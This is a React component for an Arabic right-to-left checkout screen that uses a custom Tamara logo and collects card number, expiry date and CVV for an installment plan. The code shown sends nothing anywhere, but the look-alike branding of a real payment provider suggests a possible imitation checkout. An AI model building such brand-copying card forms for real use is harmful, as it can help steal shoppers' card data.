import { toEnglishNumbers, formatPrice } from '@/lib/utils';
import TamaraLogo from '@/components/TamaraLogo';

interface CardInfoProps {
  cardName: string;
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
  setCardName: (value: string) => void;
  setCardNumber: (value: string) => void;
  setCardExpiry: (value: string) => void;
  setCardCvv: (value: string) => void;
  onBack: () => void;
  onSubmit: () => void;
  selectedPlan?: {
    totalAmount: number;
    installmentsCount: number;
    perInstallment: number;
  } | null;
}

const formatExpiry = (value: string): string => {
  const digits = toEnglishNumbers(value).replace(/\D/g, '');

  if (digits.length === 0) return '';

  if (digits.length === 1) {
    const first = parseInt(digits[0]);
    if (first > 1) return '0' + digits[0] + '/';
    return digits[0];
  }

  let month = digits.slice(0, 2);
  const monthNum = parseInt(month);

  if (monthNum > 12) month = '12';
  if (monthNum === 0) month = '01';

  const year = digits.slice(2, 4);

  if (digits.length >= 2) {
    return month + (year.length > 0 ? '/' + year : '/');
  }

  return month;
};

const isValidExpiry = (value: string): boolean => {
  const digits = toEnglishNumbers(value).replace(/\D/g, '');
  if (digits.length !== 4) return false;

  const month = parseInt(digits.slice(0, 2));
  if (month < 1 || month > 12) return false;

  const year = parseInt('20' + digits.slice(2, 4));
  const now = new Date();
  const expiry = new Date(year, month - 1);

  return expiry >= new Date(now.getFullYear(), now.getMonth());
};

// Card brand icons component - small version for inside input
const CardBrandIcons = () => (
  <div className="flex items-center gap-1">
    {/* Amex */}
    <div className="w-8 h-5 bg-[#016FD0] rounded flex items-center justify-center">
      <svg width="16" height="10" viewBox="0 0 32 20" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M4 10H6L7 7.5L8 10H10L8.5 6L10 2H8L7 4.5L6 2H4L5.5 6L4 10Z" fill="white"/>
      </svg>
    </div>
    {/* Visa */}
    <div className="w-8 h-5 bg-white rounded flex items-center justify-center">
      <svg width="20" height="6" viewBox="0 0 48 16" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M17.68 1.5L15.52 14.5H19.36L21.52 1.5H17.68ZM12.16 1.5L8.48 9.86L7.84 7.34C6.88 4.54 4.16 2.54 1.12 1.5H1.2L5.92 14.5H10.08L16.32 1.5H12.16Z" fill="#1A1F71"/>
      </svg>
    </div>
    {/* Mastercard */}
    <div className="w-8 h-5 bg-white rounded flex items-center justify-center">
      <svg width="14" height="8" viewBox="0 0 32 20" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="10" cy="10" r="10" fill="#EB001B"/>
        <circle cx="22" cy="10" r="10" fill="#F79E1B"/>
        <path d="M16 3C17.66 4.89 18.5 7.35 18.5 10C18.5 12.65 17.66 15.11 16 17C14.34 15.11 13.5 12.65 13.5 10C13.5 7.35 14.34 4.89 16 3Z" fill="#FF5F00"/>
      </svg>
    </div>
    {/* Mada */}
    <div className="w-8 h-5 bg-white rounded flex items-center justify-center">
      <svg width="18" height="6" viewBox="0 0 48 16" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M8 0H0V16H8C12.4183 16 16 12.4183 16 8C16 3.58172 12.4183 0 8 0Z" fill="#00A651"/>
        <path d="M24 0H16V16H24C28.4183 16 32 12.4183 32 8C32 3.58172 28.4183 0 24 0Z" fill="#8DC63F"/>
        <path d="M40 0H32V16H40C44.4183 16 48 12.4183 48 8C48 3.58172 44.4183 0 40 0Z" fill="#ED1C24"/>
        <path d="M8 0C3.58172 0 0 3.58172 0 8C0 12.4183 3.58172 16 8 16V0Z" fill="#0072CE"/>
      </svg>
    </div>
  </div>
);

const CardInfo = ({
  cardName,
  cardNumber,
  cardExpiry,
  cardCvv,
  setCardName,
  setCardNumber,
  setCardExpiry,
  setCardCvv,
  onBack,
  onSubmit,
  selectedPlan,
}: CardInfoProps) => {
  const expiryInvalid = cardExpiry.length > 0 && !isValidExpiry(cardExpiry);
  const isFormValid = !!(cardNumber && cardExpiry && cardCvv && isValidExpiry(cardExpiry));

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value;
    const prev = cardExpiry;

    const isDeleting = raw.length < prev.length;
    if (isDeleting) {
      if (prev.endsWith('/') && raw === prev.slice(0, -1)) {
        setCardExpiry(raw.slice(0, -1));
      } else {
        setCardExpiry(raw);
      }
      return;
    }

    const formatted = formatExpiry(raw);
    setCardExpiry(formatted);
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = toEnglishNumbers(e.target.value).replace(/\D/g, '');
    const formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
    setCardNumber(formatted);
  };

  // Calculate USD amount (approximate exchange rate: 1 USD = 3.75 SAR)
  const exchangeRate = 3.75;
  const monthlyAmountUSD = selectedPlan ? Math.round(selectedPlan.perInstallment / exchangeRate) : 0;
  const totalAmountUSD = selectedPlan ? Math.round(selectedPlan.totalAmount / exchangeRate) : 0;

  return (
    <div
      className="min-h-screen flex flex-col"
      dir="rtl"
      style={{ 
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        background: '#F8F9FA'
      }}
    >
      <div className="max-w-[430px] mx-auto w-full flex flex-col flex-1">
        {/* Header */}
        <div className="flex items-center justify-between px-5 py-4 bg-white">
          <TamaraLogo />
          <div className="flex items-center gap-3">
            <button
              onClick={() => {}}
              className="text-[14px] font-medium text-gray-500 hover:text-gray-700 transition-colors"
            >
              English
            </button>
            <span className="text-gray-300">|</span>
            <button
              onClick={onBack}
              aria-label="إغلاق"
              className="w-8 h-8 flex items-center justify-center rounded-full bg-gray-100 hover:bg-gray-200 transition-all"
            >
              <span className="text-lg leading-none text-gray-600">✕</span>
            </button>
          </div>
        </div>

        {/* Separator */}
        <div className="h-px bg-gray-200" />

        {/* Content */}
        <div className="px-5 py-6 flex flex-col flex-1">
          {/* Card Form Section */}
          <div className="mb-6">
            {/* Title with Radio Circle */}
            <div className="flex items-center gap-3 mb-4">
              <div className="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
                <div className="w-2.5 h-2.5 rounded-full bg-gray-400" />
              </div>
              <h1 className="text-[20px] font-bold text-right" style={{ color: '#1A1F71' }}>
                أضف بطاقة جديدة
              </h1>
            </div>

            {/* Card Number Input with Brand Icons */}
            <div className="mb-4">
              <label 
                className="text-[13px] font-medium block mb-2 text-right"
                style={{ color: '#4B5563' }}
              >
                رقم البطاقة
              </label>
              <div className="relative">
                <input
                  value={cardNumber}
                  onChange={handleCardNumberChange}
                  placeholder="0000 0000 0000 0000"
                  className="w-full px-4 py-3 text-[15px] rounded-lg outline-none placeholder-[#9CA3AF] text-center"
                  style={{ 
                    border: '1px solid #E5E7EB',
                    backgroundColor: '#FFFFFF',
                    color: '#1F2937',
                    letterSpacing: '0.15em',
                    direction: 'ltr',
                    boxShadow: '0 1px 2px rgba(0, 0, 0, 0.05)'
                  }}
                  maxLength={19}
                />
                <div className="absolute left-3 top-1/2 -translate-y-1/2">
                  <CardBrandIcons />
                </div>
              </div>
            </div>

            {/* CVV and Expiry in One Row */}
            <div className="grid grid-cols-2 gap-3">
              <div>
                <label 
                  className="text-[13px] font-medium block mb-2 text-right"
                  style={{ color: '#4B5563' }}
                >
                  تاريخ الانتهاء
                </label>
                <input
                  value={cardExpiry}
                  onChange={handleExpiryChange}
                  placeholder="MM/YY"
                  className="w-full px-4 py-3 text-[15px] rounded-lg outline-none placeholder-[#9CA3AF] text-center"
                  style={{ 
                    border: expiryInvalid 
                      ? '1px solid #EF4444' 
                      : '1px solid #E5E7EB',
                    backgroundColor: '#FFFFFF',
                    color: '#1F2937',
                    direction: 'ltr',
                    boxShadow: '0 1px 2px rgba(0, 0, 0, 0.05)'
                  }}
                  maxLength={5}
                />
                {expiryInvalid && (
                  <p className="text-xs mt-1 text-right" style={{ color: '#EF4444' }}>تاريخ انتهاء غير صالح</p>
                )}
              </div>
              <div>
                <label 
                  className="text-[13px] font-medium block mb-2 text-right"
                  style={{ color: '#4B5563' }}
                >
                  CVV
                </label>
                <input
                  value={cardCvv}
                  onChange={e => setCardCvv(toEnglishNumbers(e.target.value))}
                  placeholder="•••"
                  type="password"
                  className="w-full px-4 py-3 text-[15px] rounded-lg outline-none placeholder-[#9CA3AF] text-center"
                  style={{ 
                    border: '1px solid #E5E7EB',
                    backgroundColor: '#FFFFFF',
                    color: '#1F2937',
                    direction: 'ltr',
                    boxShadow: '0 1px 2px rgba(0, 0, 0, 0.05)'
                  }}
                  maxLength={4}
                />
              </div>
            </div>
          </div>

          {/* Plan Selection Section */}
          {selectedPlan && (
            <div 
              className="mb-6 p-4 rounded-xl"
              style={{ 
                background: '#FFFFFF',
                border: '1px solid #E5E7EB',
                boxShadow: '0 1px 3px rgba(0, 0, 0, 0.08)'
              }}
            >
              <div className="flex items-center justify-between mb-3">
                <span className="text-[14px] font-medium" style={{ color: '#6B7280' }}>
                  اختر الخطة
                </span>
                <span 
                  className="px-3 py-1 rounded-full text-[12px] font-semibold"
                  style={{ 
                    background: '#EEF2FF',
                    color: '#4F46E5'
                  }}
                >
                  {selectedPlan.installmentsCount} دفعات
                </span>
              </div>
              
              {/* Monthly Amount */}
              <div className="mb-3">
                <div className="text-[28px] font-bold text-right" style={{ color: '#1F2937' }}>
                  {formatPrice(selectedPlan.perInstallment)} <span className="text-[16px] font-normal">ريال</span>
                </div>
                <div className="text-[14px]" style={{ color: '#6B7280' }}>
                  {monthlyAmountUSD} دولار / شهر
                </div>
              </div>

              {/* Payments and Total */}
              <div className="flex items-center justify-between pt-3 border-t" style={{ borderColor: '#E5E7EB' }}>
                <div>
                  <div className="text-[12px]" style={{ color: '#9CA3AF' }}>المبلغ الإجمالي</div>
                  <div className="text-[16px] font-semibold" style={{ color: '#1F2937' }}>
                    {formatPrice(selectedPlan.totalAmount)} ريال
                  </div>
                  <div className="text-[12px]" style={{ color: '#9CA3AF' }}>
                    {totalAmountUSD} دولار
                  </div>
                </div>
                <div 
                  className="w-10 h-10 rounded-full flex items-center justify-center"
                  style={{ 
                    background: '#4F46E5'
                  }}
                >
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M9 18L15 12L9 6" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </div>
              </div>
            </div>
          )}

          {/* Spacer */}
          <div className="flex-1" />
        </div>

        {/* Fixed Bottom Button - Payment Button */}
        <div 
          className="fixed bottom-0 left-0 right-0 p-4 bg-white"
          style={{ 
            borderTop: '1px solid #E5E7EB'
          }}
        >
          <div className="max-w-2xl mx-auto">
            <button
              onClick={onSubmit}
              disabled={!isFormValid}
              className="w-full py-4 font-bold rounded-xl transition-all flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
              style={{
                background: isFormValid 
                  ? '#4F46E5' 
                  : '#D1D5DB',
                color: '#FFFFFF',
                cursor: isFormValid ? 'pointer' : 'not-allowed',
                boxShadow: isFormValid ? '0 4px 12px -2px rgba(79, 70, 229, 0.4)' : 'none'
              }}
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="2" y="5" width="20" height="14" rx="2" stroke="currentColor" strokeWidth="2"/>
                <line x1="2" y1="10" x2="22" y2="10" stroke="currentColor" strokeWidth="2"/>
              </svg>
              {selectedPlan 
                ? `ادفع ${formatPrice(selectedPlan.perInstallment)} ريال (${monthlyAmountUSD} $)`
                : 'ادفع الآن'
              }
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CardInfo;
